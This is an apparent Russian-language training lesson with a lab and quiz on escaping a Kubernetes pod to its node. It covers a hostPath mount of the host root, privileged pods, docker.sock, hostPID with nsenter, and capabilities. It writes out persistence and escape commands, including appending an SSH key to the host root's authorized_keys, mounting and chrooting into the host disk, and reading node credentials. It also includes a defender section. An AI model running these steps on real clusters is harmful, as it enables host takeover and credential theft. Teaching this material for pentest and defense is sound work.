---
id: cloud-kubernetes-escape
title: "Побег из пода: hostPath, privileged, nsenter и capability-трюки"
category: cloud
parent: cloud-containers-docker
difficulty: hard
order: 2
tags: [cloud, kubernetes, escape, hostpath, privileged, nsenter, container]
prerequisites: [cloud-containers-docker, cloud-kubernetes-rbac]
useful_for:
  - "Побег из контейнера/пода на хост"
  - "Пентест Kubernetes-кластеров"
  - "Понимание, когда контейнер = хост"
estimated_minutes: 40
summary: "Полный разбор побега из пода на хост: hostPath, privileged, hostPID/hostNetwork, capabilities, монтирование docker.sock и ядерные трюки. Что проверить в первую очередь."
lab:
  kind: shell
  title: "Практика: побег из пода через hostPath"
  toolset: [core]
  workdir: /home/student/k8s
  files: [task.md, notes.md, pod.yaml]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Прочитай `pod.yaml`: у пода смонтирован hostPath `/` (корень ноды) — это побег."
    - "Внутри смонтированного каталога `mnt/host/` лежит файловая система ноды."
    - "Найди флаг: `find mnt/host -name flag.txt`, затем `cat ... > found.txt`."

---

## Задача

Ты уже внутри кластера: через уязвимость в веб-приложении получил **shell внутри пода** — одного из контейнеров Kubernetes. Shell есть, но он в песочнице: файлы только свои, сеть своя, процессы только свои. Цель — выйти **на саму ноду** (машину-хост кластера), где лежат kubelet-креды, конфиги и, скорее всего, доступ к облачному аккаунту.

Контейнер изолирует процесс через **namespaces** — ядровые «песочницы» для файлов, процессов, сети — и **cgroups** — лимиты ресурсов. Побег возможен, когда эта изоляция настроена неверно. Разберём на одном реальном поде.

## Данные, с которыми работаем

У нас shell в поде, имя хоста `web-7f9c-abc`. Первое — понять, что мы вообще в контейнере и что нам доступно. Эти команды безопасны (только чтение) и не изменяют систему.

```bash
$ id
uid=1000(app) gid=1000(app) groups=1000(app)
$ cat /proc/1/cgroup | head -2
12:freezer:/kubepods/burstable/pod8f3a.../...
11:cpuset:/kubepods/...
```

Строка `kubepods` в cgroup — верный признак: мы внутри Kubernetes-контейнера. Теперь ищем **примонтированные хостовые пути** — это самое частое окно наружу.

```bash
$ cat /proc/self/mountinfo | grep -iE ' /host | /etc | docker.sock'
871 660 0:57 / /host rw,relatime shared:1 - ext4 /dev/sda1 rw
```

`/host` смонтирован из `/dev/sda1` — это **корень хостовой машины**, отданный нам в папку `/host`. Так делают, когда контейнеру «нужен доступ к хосту» (сбор логов, метрик). Нам этого достаточно.

## Пробуем в лоб: что видно в /host

Прежде чем что-то менять — читаем, чтобы убедиться, что это настоящий корень ноды, а не пустышка:

```bash
$ ls /host
bin  boot  dev  etc  home  lib  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
$ head -1 /host/etc/hostname
node-prod-01
```

Да, это файловая система ноды `node-prod-01`. Теперь аккуратно, **минимальным действием**, закрепляемся: дописываем свой публичный SSH-ключ в `authorized_keys` root'а хоста. `authorized_keys` — файл, в который можно вписать публичный ключ, и тогда вход по SSH с парным приватным ключом разрешён без пароля.

```bash
$ mkdir -p /host/root/.ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... analyst@kali" >> /host/root/.ssh/authorized_keys
$ cat /host/root/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... analyst@kali
```

**Важно прочитать файл обратно** (`cat`) — так мы убеждаемся, что запись реально прошла, а не «вроде сработало». Теперь заходим на ноду:

```bash
$ ssh -i /tmp/id_ed25519 root@10.10.20.15
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Мы root на хосте кластера. Один смонтированный `/host` превратил пода-shell в root на ноде.

## Другие векторы: что проверять по порядку

Побег не всегда через hostPath. В Kubernetes есть пять типовых «дыр». Проверяй их в таком порядке — от самого лёгкого.

**1. privileged-под.** Если в манифесте стоит `securityContext.privileged: true`, контейнеру выдали почти все права ядра и устройства хоста. Проверка — по маске capabilities:

```bash
$ grep CapEff /proc/self/status
CapEff:	0000003fffffffff
```

`0000003fffffffff` — это «все capabilities»: фактически root хоста. Тогда монтируем диск напрямую:

```bash
$ fdisk -l | grep '^Disk /dev/sd'
Disk /dev/sda: 40 GiB
$ mkdir /mnt/h && mount /dev/sda1 /mnt/h && chroot /mnt/h /bin/bash
```

**2. docker.sock.** Если в под смонтирован `/var/run/docker.sock` — это unix-сокет Docker-демона хоста. Демон работает от root, значит, мы тоже:

```bash
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock
$ docker -H unix:///var/run/docker.sock ps
CONTAINER ID   IMAGE          COMMAND
b1c2...        nginx:1.25     "nginx -g daemon off;"
```

**3. Лишние capabilities.** Даже без `privileged` контейнеру могли выдать отдельные права. Ключевое — `CAP_SYS_ADMIN` (разрешает монтирование и трюк с cgroup):

```bash
$ capsh --print | grep -i sys_admin
Current: ... cap_sys_admin ...
```

**4. hostPID / hostNetwork.** Если `hostPID: true`, в контейнере видны процессы хоста, и PID 1 — это init ноды. Тогда входим в его namespaces через `nsenter` (утилита «войти в пространства имён другого процесса»):

```bash
$ ps aux | wc -l
142
$ nsenter -t 1 -m -u -i -n -p -- bash
$ hostname
node-prod-01
```

`hostNetwork: true` даёт доступ к сети ноды — а значит, к `169.254.169.254`, сервису метаданных облака, который выдаёт временные креды инстанса.

**5. Записываемые `/proc/sys`.** Если `/proc/sys` доступен на запись, можно подменить `core_pattern` — шаблон, по которому ядро запускает обработчик краша процесса, — и выполнить произвольную команду на хосте.

## Если не сработало

- **Всё закрыто (restricted).** Если под запущен под жёсткой Pod Security Admission, ни один из векторов не сработает — тогда путь наружу через RBAC: ищи service-account токен и права на создание подов/`exec`.
- **Сначала разведка, потом запись.** Не начинай с правки `/etc/sudoers` — это ломает систему. Сделай минимальный PoC (прочитай `/host/etc/hostname`), убедись, что путь рабочий и обратимый, и только потом закрепляйся.
- **Автоинструменты.** `./deepce.sh --no-write` (только разведка) и `./cdk evaluate` переберут векторы за тебя — но вывод всё равно проверяй руками.

## Что мы теперь знаем

- `kubepods` в cgroup = мы в поде; `mountinfo` показывает смонтированные хостовые пути.
- `hostPath` на `/` даёт чтение/запись всей файловой системы ноды.
- `privileged` и `CAP_SYS_ADMIN` позволяют монтировать диск и делать `chroot`.
- `docker.sock` в поде = root, потому что демон хоста работает от root.
- `hostPID`/`hostNetwork` открывают `nsenter` к PID 1 и метаданные облака.
- Сначала читаем и проверяем путь, потом меняем систему — иначе потеряешь кластер.

## На что смотреть дальше

- **kubelet API (10250/10255)**: анонимный доступ и RCE на ноде.
- **RBAC Kubernetes**: как из service-account токена получить права на поды.
- **Метаданные облака** `169.254.169.254`: как из ноды достать роль инстанса.

## Глазами защитника

Защита от побега — это в первую очередь запрет опасных конфигураций: Pod Security Standards (restricted) запрещают `privileged`, `hostPath`, `hostPID`, `hostNetwork` и лишние capabilities. Admission-контроллеры (OPA/Kyverno) добавляют политики поверх. Монтирование `docker.sock` и корня хоста должно быть исключением с явным обоснованием. RBAC ограничивает, кто может создавать поды с такими настройками: право `create pods` в привилегированном namespace равно побегу. Регулярно проверяют `securityContext` существующих подов и используют runtime-детект (Falco) на монтирование диска, `nsenter` и доступ к `/host`.

## Частые вопросы

**Как понять, что под уязвим, ещё до shell?**

Посмотри его манифест: `kubectl get pod -o yaml` — поля `privileged`, `hostPath`, `hostPID`, `hostNetwork`, `capabilities`. Любое из них — потенциальный побег.

**Что если все векторы закрыты?**

Иди через RBAC: токен service account может давать права на создание подов, `exec` или чтение секретов. Иногда путь наружу не через конфиг пода, а через его права.

**Почему `hostPID` достаточно для побега?**

При `hostPID` виден PID 1 хоста, и `nsenter -t 1` входит в его namespaces. Дальше ты в контексте ноды без монтирования диска.

**Опасен ли `hostNetwork` сам по себе?**

Он не даёт файлового доступа, но открывает сеть ноды, включая metadata-сервер `169.254.169.254`, откуда берутся креды instance profile.

**Как закрепиться после побега?**

Минимальным обратимым действием: SSH-ключ в `authorized_keys`, затем вход. Не правь `sudoers` и не ломай систему — иначе потеряешь ноду.

**Обязателен ли `privileged` для `chroot`?**

Нет. Если смонтирован корень хоста (`hostPath: /`), достаточно `chroot /host /bin/bash`. `privileged` нужен, когда корень не смонтирован и надо монтировать диск самому.

**Что делать, если `/host` смонтирован только на чтение?**

Прочитай конфиги, kubeconfig, токены и SSH-ключи ноды. Даже read-only корень часто даёт креды для дальнейшего доступа — например, `kubelet.conf` или облачные токены в файлах.

**Опасна ли `CAP_SYS_PTRACE`?**

Она позволяет трассировать процессы хоста (при `hostPID`) и читать их память, включая секреты и токены. Это тихий путь к данным без монтирования диска.

**Как понять, что мы уже на хосте, а не в контейнере?**

`cat /proc/1/cgroup` без `kubepods` и `hostname` ноды; наличие реальных процессов init, обычные `/etc/passwd` и `/etc/shadow`. Всегда проверяй, а не предполагай.

**Всегда ли нужен hostPath для побега?**

Нет. `privileged` позволяет смонтировать диск самому, `hostPID` — войти через `nsenter`, `docker.sock` — запустить привилегированный контейнер. Это независимые векторы, и достаточно одного.

**Что делать, если ничего из этого нет?**

Смотри RBAC service account: права на `create pods`, `pods/exec`, чтение секретов или `pods/attach`. Иногда побег идёт не от конфига пода, а от его ролей в кластере.

## Квиз

Проверь себя.

```quiz
- question: "Какая настройка пода делает побег через chroot на хост тривиальным?"
  options:
    - "resources.limits"
    - "securityContext.privileged: true"
    - "restartPolicy"
    - "imagePullPolicy"
  answer: 1
  explanation: "Privileged даёт почти полный доступ к хосту, включая монтирование дисков."
- question: "Почему смонтированный /var/run/docker.sock опасен?"
  options:
    - "Он доступен только на чтение"
    - "Он даёт полный контроль над Docker на узле, включая запуск привилегированных контейнеров с монтированием /"
    - "Он шифрует данные"
    - "Он не связан с побегом"
  answer: 1
  explanation: "Через docker.sock можно запустить контейнер с -v /:/host --privileged и войти на хост."
- question: "Какая capability позволяет использовать release_agent cgroup для побега?"
  options:
    - "CAP_NET_RAW"
    - "CAP_SYS_ADMIN"
    - "CAP_CHOWN"
    - "CAP_KILL"
  answer: 1
  explanation: "CAP_SYS_ADMIN разрешает монтирование cgroup, что открывает трюк с release_agent."
- question: "Что даёт hostPID: true для побега?"
  options:
    - "Ускоряет работу пода"
    - "Позволяет через nsenter -t 1 войти в namespace процессов хоста"
    - "Отключает сеть"
    - "Монтирует диск автоматически"
  answer: 1
  explanation: "hostPID разделяет таблицу процессов с хостом, поэтому PID 1 — это init узла."
- question: "Какой hostPath-путь чаще всего ведёт к немедленному побегу?"
  options:
    - "/tmp"
    - "корень /, /etc или docker.sock"
    - "/proc/self"
    - "/dev/null"
  answer: 1
  explanation: "Монтирование корня хоста, /etc или docker.sock даёт запись в критичные файлы узла."
```

## Куда дальше

В следующем уроке мы разберём **RBAC Kubernetes**: как из service-account токена понять, что тебе разрешено, и как из «скучного» права `create pods` получить root. А пока главное запомни: **контейнер — не песочница по умолчанию**; один `hostPath` или `privileged` ломает всю изоляцию.

## Где пригодится

- **Пентест Kubernetes** — побег из пода на узел.
- **Red team** — движение от пода к кластеру.
- **CTF** — категории Cloud/Container.
- **IR/Blue team** — оценка риска конфигураций подов.
- **DevSecOps** — внедрение Pod Security Standards.
